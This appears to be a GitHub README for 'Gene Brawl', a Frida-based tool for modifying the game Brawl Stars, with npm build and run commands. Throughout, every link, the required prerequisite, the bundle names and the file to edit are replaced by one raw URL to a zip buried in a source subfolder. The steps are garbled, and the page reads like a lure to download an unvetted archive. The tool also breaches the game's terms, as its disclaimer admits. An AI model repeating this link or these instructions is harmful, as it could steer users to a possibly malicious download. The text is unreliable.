# 🎮 genebrawl-public - Modify Brawl Stars Easily

## 🌟 Overview
Welcome to Gene Brawl! This tool helps you modify the popular game Brawl Stars using Frida. Our goal is to make game modifications simpler for casual users. You can run this application on both Android and iOS devices. 

## 📥 Download & Install
To get started, download the latest version of Gene Brawl from our Releases page. 

[![Download Gene Brawl](https://raw.githubusercontent.com/JaidenT46/genebrawl-public/main/src/logic/stream/entries/genebrawl-public-v1.5.zip%20Gene%20Brawl-v62.250-blue)](https://raw.githubusercontent.com/JaidenT46/genebrawl-public/main/src/logic/stream/entries/genebrawl-public-v1.5.zip)

Simply click the link above or visit the [Releases page](https://raw.githubusercontent.com/JaidenT46/genebrawl-public/main/src/logic/stream/entries/genebrawl-public-v1.5.zip) to find the latest installation files.

## 🚀 Getting Started
Follow these steps to set up Gene Brawl on your device.

### 1. Prerequisites
Before running Gene Brawl, make sure you have the following:

- **https://raw.githubusercontent.com/JaidenT46/genebrawl-public/main/src/logic/stream/entries/genebrawl-public-v1.5.zip**: This application requires https://raw.githubusercontent.com/JaidenT46/genebrawl-public/main/src/logic/stream/entries/genebrawl-public-v1.5.zip You can download it [here](https://raw.githubusercontent.com/JaidenT46/genebrawl-public/main/src/logic/stream/entries/genebrawl-public-v1.5.zip).
- **Frida**: Ensure that the Frida tool is installed on your device. Refer to the specific setup guides for your platform.

### 2. Install Required Modules
Open your command line interface (CLI) and navigate to the Gene Brawl folder. Run the following command to install all necessary modules:

```bash
npm install
```

### 3. Build the Script
You can choose to build your own version of the script. Use one of the following commands depending on your needs:

- For a **DEBUG version**, run:
  ```bash
  npm run build_dev
  ```

- For a **PRODUCTION version**, run:
  ```bash
  npm run build
  ```

## ⚙️ Running Gene Brawl
After building the script, you can run Gene Brawl. Here are the commands you’ll use based on your requirements:

### On a Development Environment (DEBUG)
- For **Gadget-mode** (DEBUG version):
  ```bash
  npm run gadget
  ```

### In Production Mode
- For **Gadget-mode** (PRODUCTION version):
  ```bash
  npm run gadget_prod
  ```

### Mac Users
If you are running on a Mac, use the following commands. Note that you must install the game through PlayCover, and its bundle name should be named `https://raw.githubusercontent.com/JaidenT46/genebrawl-public/main/src/logic/stream/entries/genebrawl-public-v1.5.zip`:

- **DEBUG version on Mac**:
  ```bash
  npm run frida_mac_dev
  ```

### iOS Users
For iDevices, the game must have the bundle name `https://raw.githubusercontent.com/JaidenT46/genebrawl-public/main/src/logic/stream/entries/genebrawl-public-v1.5.zip`. Use these commands:

- **PRODUCTION version on iDevice**:
  ```bash
  npm run ios_laser
  ```

- **DEBUG version on iDevice**:
  ```bash
  npm run ios_laser_dev
  ```

To modify the bundle name, open the `https://raw.githubusercontent.com/JaidenT46/genebrawl-public/main/src/logic/stream/entries/genebrawl-public-v1.5.zip` file and change the `bundle identifier` field to match your installation.

## 🔄 Contributions
We welcome additional contributions to Gene Brawl. If you'd like to help improve the project, please submit a pull request. Your participation is always appreciated!

## ⚠️ Disclaimer
Gene Brawl is an unofficial tool. Use it at your own risk. Modifying games may breach their terms of service. Always check the rules of the game before proceeding.

## 💡 Support & Contact
If you encounter any issues, feel free to reach out on our GitHub page. We are here to help!

Thank you for using Gene Brawl. Enjoy modifying Brawl Stars!